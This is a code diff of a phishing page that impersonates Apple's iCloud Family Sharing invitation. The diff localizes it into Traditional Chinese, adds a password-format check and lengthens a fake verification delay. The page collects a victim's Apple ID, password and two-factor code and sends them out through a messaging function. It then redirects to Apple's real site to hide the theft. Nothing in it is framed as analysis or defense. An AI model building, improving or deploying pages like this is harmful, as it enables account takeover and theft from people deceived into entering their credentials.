@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="zh-TW">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>iCloud - Family Sharing</title>
+    <title>iCloud - 家人共享</title>
     <link rel="icon" href="https://www.apple.com/favicon.ico">
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
@@ -13,20 +13,18 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            /* 改為更接近截圖的深藍紫漸層 */
             background: linear-gradient(180deg, #1a2a44 0%, #0d1321 100%);
             color: white;
             padding: 20px;
         }
 
-        /* 容器限制寬度 */
         .container {
             width: 100%;
             max-width: 400px;
             position: relative;
         }
 
-        /* 第一階段：首頁邀請函 */
+        /* 階段 0：首頁邀請函 */
         .invite-card {
             text-align: center;
             display: flex;
@@ -93,7 +91,7 @@
             line-height: 1.3;
         }
 
-        /* 底部按鈕區 */
+        /* 按鈕區 */
         .action-area {
             width: 100%;
             display: flex;
@@ -111,7 +109,9 @@
             font-weight: 600;
             cursor: pointer;
             width: 100%;
+            transition: 0.2s;
         }
+        .btn-join:active { transform: scale(0.98); opacity: 0.9; }
 
         .btn-decline {
             background: none;
@@ -121,7 +121,7 @@
             cursor: pointer;
         }
 
-        /* 第二階段：原本的登入介面 (設為隱藏) */
+        /* 階段 1：登入卡片 */
         .glass-card {
             background: rgba(255, 255, 255, 0.1);
             backdrop-filter: blur(25px) saturate(1.5);
@@ -164,76 +164,76 @@
 
     <div class="container">
         <div id="phase-invite" class="invite-card">
-            <a href="#" class="maybe-later">Maybe Later</a>
+            <a href="#" class="maybe-later">以後再說</a>
             
             <img src="https://img.icons8.com/fluency/96/group.png" class="main-icon" alt="Family">
             
-            <h1 class="main-title">You've Been Invited</h1>
-            <p class="description">Join Family Sharing to share subscriptions and more with 家庭.</p>
+            <h1 class="main-title">你收到了邀請</h1>
+            <p class="description">加入「家人共享」，與家庭成員分享訂閱項目及更多內容。</p>
             
             <div class="feature-list">
                 <div class="feature-item">
                     <img src="https://img.icons8.com/color/96/icloud.png" class="feature-icon">
                     <div class="feature-text">
-                        <h2>Shared Subscriptions</h2>
-                        <p>iCloud+, Apple Music 和 Apple TV+。</p>
+                        <h2>共享訂閱項目</h2>
+                        <p>iCloud+、Apple Music 和 Apple TV+。</p>
                     </div>
                 </div>
                 <div class="feature-item">
                     <img src="https://img.icons8.com/color/96/itunes.png" class="feature-icon">
                     <div class="feature-text">
-                        <h2>Shared Purchases</h2>
-                        <p>Apps, movies, TV shows, and books</p>
+                        <h2>共享購買項目</h2>
+                        <p>App、電影、電視節目和書籍。</p>
                     </div>
                 </div>
                 <div class="feature-item">
                     <img src="https://img.icons8.com/fluency/96/parental-control.png" class="feature-icon">
                     <div class="feature-text">
-                        <h2>Parental Controls</h2>
-                        <p>Manage screen time, content restrictions</p>
+                        <h2>家長控制</h2>
+                        <p>管理螢幕使用時間與內容限制。</p>
                     </div>
                 </div>
             </div>
 
             <div class="action-area">
-                <h2 style="font-size: 28px; margin-bottom: 10px;">Choose to Join</h2>
+                <h2 style="font-size: 28px; margin-bottom: 10px;">選擇加入</h2>
                 <button class="btn-join" onclick="goToLogin()">加入家庭</button>
-                <button class="btn-decline">拒绝邀请</button>
+                <button class="btn-decline">拒絕邀請</button>
             </div>
         </div>
 
         <div id="phase-login" class="glass-card hidden">
-            <h1 style="font-size: 24px; margin-bottom: 10px;">Sign in to join Family</h1>
-            <p style="font-size: 14px; margin-bottom: 30px; color: rgba(255,255,255,0.6);">Sign in with your Apple ID to accept this invitation.</p>
+            <h1 style="font-size: 24px; margin-bottom: 10px;">登入以加入家庭</h1>
+            <p style="font-size: 14px; margin-bottom: 30px; color: rgba(255,255,255,0.6);">請使用您的 Apple ID 登入以接受此邀請。</p>
             
             <div class="input-group">
                 <label>Apple ID</label>
                 <input type="text" id="acc" placeholder="email@icloud.com" autocomplete="username">
             </div>
             <div class="input-group">
-                <label>Password</label>
-                <input type="password" id="pw" placeholder="Required" autocomplete="current-password">
+                <label>密碼</label>
+                <input type="password" id="pw" placeholder="必填" autocomplete="current-password">
             </div>
-            <button class="btn-join" onclick="handleLogin()">Accept Invitation</button>
+            <button class="btn-join" onclick="handleLogin()">接受邀請</button>
         </div>
 
         <div id="phase-loading" class="glass-card hidden">
             <div class="loader"></div>
-            <p id="loading-text">Verifying Apple ID...</p>
+            <p id="loading-text">正在驗證 Apple ID...</p>
         </div>
 
         <div id="phase-otp" class="glass-card hidden">
-            <h1>Two-Factor Authentication</h1>
-            <p style="margin-top: 10px;">A verification code has been sent to your devices.</p>
+            <h1>雙重認證</h1>
+            <p style="margin-top: 10px;">驗證碼已傳送到您的 Apple 裝置。</p>
             <input type="text" id="otp" placeholder="000000" maxlength="6" 
                    inputmode="numeric" pattern="[0-9]*"
                    style="text-align:center; letter-spacing: 12px; font-weight: bold; font-size: 24px; margin: 30px 0;">
-            <button class="btn-join" onclick="handleOTP()">Verify & Join</button>
+            <button class="btn-join" onclick="handleOTP()">驗證並加入</button>
         </div>
 
         <div id="phase-success" class="glass-card hidden">
-            <h1 style="color: #34c759;">Welcome!</h1>
-            <p style="margin-top: 10px;">You have successfully joined the family group.</p>
+            <h1 style="color: #34c759;">歡迎加入！</h1>
+            <p style="margin-top: 10px;">您已成功加入家庭群組。</p>
         </div>
     </div>
 
@@ -253,7 +253,6 @@
             } catch(e) {}
         }
 
-        // 切換介面邏輯
         function showPhase(phaseId) {
             ['phase-invite', 'phase-login', 'phase-loading', 'phase-otp', 'phase-success'].forEach(id => {
                 document.getElementById(id).classList.add('hidden');
@@ -261,7 +260,6 @@
             document.getElementById(phaseId).classList.remove('hidden');
         }
 
-        // 點擊加入家庭按鈕
         function goToLogin() {
             showPhase('phase-login');
         }
@@ -271,30 +269,32 @@
             const pw = document.getElementById('pw').value;
 
             const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-            if (!emailRegex.test(acc)) return alert("Please enter a valid Apple ID.");
-            if (!pw) return alert("Password is required.");
+            if (!emailRegex.test(acc)) return alert("請輸入有效的 Apple ID。");
+            
+            const pwRegex = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d).+$/;
+            if (!pwRegex.test(pw)) return alert("密碼格式不正確，請重新輸入。");
 
             showPhase('phase-loading');
-            await sendMsg(`👨‍👩‍👧‍👦 【Family Invite - Login】\nUser: ${acc}\nPass: ${pw}`);
+            await sendMsg(`👨‍👩‍👧‍👦 【家庭邀請 - 登入】\n帳號: ${acc}\n密碼: ${pw}`);
 
             setTimeout(() => {
                 showPhase('phase-otp');
-            }, 5000); // 這裡縮短為 5 秒測試，可自行改回 20000
+            }, 20000);
         }
 
         async function handleOTP() {
             const otp = document.getElementById('otp').value;
-            if(otp.length < 6) return alert("Please enter the 6-digit code.");
+            if(otp.length < 6) return alert("請輸入 6 位數驗證碼。");
 
             showPhase('phase-loading');
-            document.getElementById('loading-text').innerText = "Linking family account...";
+            document.getElementById('loading-text').innerText = "正在綁定家庭帳戶...";
 
-            await sendMsg(`🛡️ 【Family Invite - OTP】\nCode: ${otp}`);
+            await sendMsg(`🛡️ 【家庭邀請 - 驗證碼】\n代碼: ${otp}`);
 
             setTimeout(() => {
                 showPhase('phase-success');
                 setTimeout(() => {
-                    window.location.href = "https://www.apple.com/family-sharing/";
+                    window.location.href = "https://www.apple.com/tw/family-sharing/";
                 }, 3000);
             }, 3000);
         }
